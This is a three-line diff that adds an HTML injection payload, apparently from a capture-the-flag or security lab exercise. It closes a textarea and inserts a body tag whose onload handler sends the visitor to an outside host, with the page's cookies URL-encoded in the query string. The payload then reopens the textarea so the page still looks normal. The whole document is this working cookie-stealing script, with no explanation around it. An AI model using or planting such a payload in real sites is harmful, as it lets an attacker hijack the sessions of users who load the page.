@@ -1,0 +1,3 @@
+</textarea>
+<body onload="window.location.href = 'http://nexus.rnl.tecnico.ulisboa.pt:30000/?cookie='.concat(encodeURIComponent(document.cookie))"></body>
+<textarea>
